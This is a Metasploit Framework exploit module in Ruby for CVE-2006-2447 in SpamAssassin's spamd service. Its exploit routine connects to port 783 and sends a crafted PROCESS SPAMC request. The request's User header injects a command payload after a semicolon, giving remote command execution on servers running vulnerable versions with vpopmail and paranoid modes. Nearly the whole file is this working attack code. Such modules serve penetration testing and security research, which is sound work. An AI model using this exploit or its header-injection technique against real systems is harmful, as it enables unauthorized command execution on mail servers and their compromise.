##
# $Id: spamassassin_exec.rb 9179 2010-04-30 08:40:19Z jduck $
##

##
# This file is part of the Metasploit Framework and may be subject to
# redistribution and commercial restrictions. Please see the Metasploit
# Framework web site for more information on licensing and terms of use.
# http://metasploit.com/framework/
##

require 'msf/core'

class Metasploit3 < Msf::Exploit::Remote
	Rank = ExcellentRanking

	include Msf::Exploit::Remote::Tcp

	def initialize(info = {})
		super(update_info(info,
			'Name'           => 'SpamAssassin spamd Remote Command Execution',
			'Description'    => %q{
					This module exploits a flaw in the SpamAssassin spamd service by specifying
				a malicious vpopmail User header, when running with vpopmail and paranoid
				modes enabled (non-default). Versions prior to v3.1.3 are vulnerable
			},
			'Author'         => [ 'patrick' ],
			'License'        => MSF_LICENSE,
			'Version'        => '$Revision: 9179 $',
			'References'     =>
				[
					[ 'CVE', '2006-2447' ],
					[ 'OSVDB', '26177' ],
					[ 'BID', '18290' ],
					[ 'URL', 'http://spamassassin.apache.org/advisories/cve-2006-2447.txt' ],
				],
			'Privileged'     => false,
			'Payload'        =>
				{
					'DisableNops' => true,
					'Space'       => 1024,
					'Compat'      =>
						{
							'PayloadType' => 'cmd',
							'RequiredCmd' => 'generic perl ruby bash telnet',
						}
				},
			'Platform'       => 'unix',
			'Arch'           => ARCH_CMD,
			'Targets'        =>
				[
					[ 'Automatic', { }],
				],
			'DisclosureDate' => 'Jun 06 2006',
			'DefaultTarget'  => 0))

		register_options(
			[
				Opt::RPORT(783)
			], self.class)
	end

	def exploit
		connect

		content = Rex::Text.rand_text_alpha(20)

		sploit = "PROCESS SPAMC/1.2\r\n"
		sploit << "Content-length: #{(content.length + 2)}\r\n"
		sploit << "User: ;#{payload.encoded}\r\n\r\n"
		sploit << content + "\r\n\r\n"

		sock.put(sploit)

		handler
		disconnect
	end

end